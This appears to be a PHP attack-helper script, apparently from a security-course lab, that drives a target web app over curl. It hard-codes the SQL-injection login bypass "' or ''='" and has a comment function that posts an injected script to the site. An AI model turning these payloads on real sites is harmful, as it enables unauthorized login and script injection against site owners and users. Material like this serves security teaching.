<?php
$user = "' or ''='";
$pass = "boom";
/**
*===================================================
* Authentication functions
*===================================================
*/
function signIn($mainUrl,$username,$password)
{
  $get_cookie_page = $mainUrl.'/post.php';
  $params =array("username"=>$username,"password"=>$password,"form"=>"login","submit"=>"Login");

  $headers =  array(
    'Accept:*',
  'Connection:keep-alive',
  'Content-Type:application/x-www-form-urlencoded',
  'User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36');

  $urlParams = createUrlParams($params);
  echo curl_post($get_cookie_page, $headers,$urlParams);
}

//Logout function
function logout($mainUrl)
{
  echo curl_get( $mainUrl.'/logout.php');
}


/*
*=====================================================
*Website action functions
*=====================================================Id1yrIFy
*/
//Commenting to a post


function comment($mainUrl, $commentId, $injectScript)
{
  $params =array("comment"=>$injectScript,"form"=>"comment","uid"=>"1","parent"=>$commentId);
  $headers =  array(
    'Accept:*',
    'Connection:keep-alive',
    'Content-Type:application/x-www-form-urlencoded',
    'User-Agent:Mozilla/5.0 (X11; Linux x86_64)
    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36');

  $urlParams = createUrlParams($params);
  curl_post($mainUrl."/post.php", $headers,$urlParams);
  echo curl_get($mainUrl."/view.php?id=".$commentId);
}

//Upload an image function
function uploadImage($mainUrl)
{
//$fp = fopen("downloag.jpg", "r");
$cfile = new CURLFILE("download.jpg",'image/jpeg' ,"");
$args = array(
    "fileToUpload"=>$cfile,
    "submit"=>"Upload Image"
);
$request = curl_init($mainUrl.'/upload.php');

// send a file
curl_setopt($request, CURLOPT_POST, true);
curl_setopt($request, CURLOPT_HTTPHEADER, array(
  'Content-Type:multipart/form-data'
));
curl_setopt($request, CURLOPT_COOKIEFILE, dirname(__FILE__)."/cookie.txt");
curl_setopt($request, CURLOPT_COOKIEJAR,  dirname(__FILE__)."/cookie.txt");
curl_setopt(
    $request,
    CURLOPT_POSTFIELDS,
    $args
    );

// output the response
curl_setopt($request, CURLOPT_RETURNTRANSFER, true);
echo curl_exec($request);

// close the session
curl_close($request);
}
//Posting an article or a picture on the site.
function postAThing($mainUrl, $type, $title, $content)
{
  $basicUrl = $mainUrl;
  $params =array("title"=>$title,"content"=>$content, "form"=>"content","type"=>$type,"submit"=>"Post");
  $headers =  array(
    'Accept:*',
    'Connection:keep-alive',
    'Content-Type:application/x-www-form-urlencoded',
    'User-Agent:Mozilla/5.0 (X11; Linux x86_64)
    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36');
  $urlParams = createUrlParams($params);
  curl_post($basicUrl."/post.php", $headers,$urlParams);
  echo curl_get($basicUrl."/index.php");
}

/**
*================================================
* Different curl request options
*================================================
**/

/**
*Curl urlfy parameters in array
*
**/
function createUrlParams($fields)
{
  foreach ($fields as $key => $value) {
    $fields[$key]= urlencode($value);
  }
  //url-ify the data for the POST
  $fields_string = "";
  foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
  rtrim($fields_string, '&');
  return $fields_string;
}


//Getting and downloading a file in address.
function getFileAtAddress($url, $path,$filename)
{
  $fp = fopen (dirname(__FILE__) . "/".$filename, 'w+');
  //Here mainUrlis the file we are downloading, replace spaces with %20
  $ch = curl_init($url."/".$path);
  curl_setopt($ch, CURLOPT_TIMEOUT, 50);
  // write curl response to file
  curl_setopt($ch, CURLOPT_FILE, $fp);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  // get curl response
  curl_exec($ch);
  curl_close($ch);
  fclose($fp);
}
/**
* Curl get request
*
*/
function curl_get($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__)."/cookie.txt");
  // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  //   'Cookie:CS458=p3o8ej8nv49mhrti3lu5th5e10'
  //
  // ));
  curl_setopt($ch, CURLOPT_COOKIEJAR,  dirname(__FILE__)."/cookie.txt");
  $output = curl_exec($ch);
  curl_close($ch);
  return $output;
}
/**
* Curl post request
*
**/
function curl_post($url, $headers, $fields=null)
{
  $ch = curl_init();
  if($url)
  {
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
    curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__)."/cookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEJAR,  dirname(__FILE__)."/cookie.txt");
    $result = curl_exec($ch);
    if($result===FALSE)
    {
      echo "Something wrong";
    }
    curl_close($ch);
    return $result;
  }

}
/**
* Curl with all headers and fields specified.
*/
function curl_with_headers($headers,$fields)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);

  curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__)."/cookie.txt");
  curl_setopt($ch, CURLOPT_COOKIEJAR,  dirname(__FILE__)."/cookie.txt");
  $result = curl_exec($ch);
  curl_close($ch);
  return $result;
}

?>
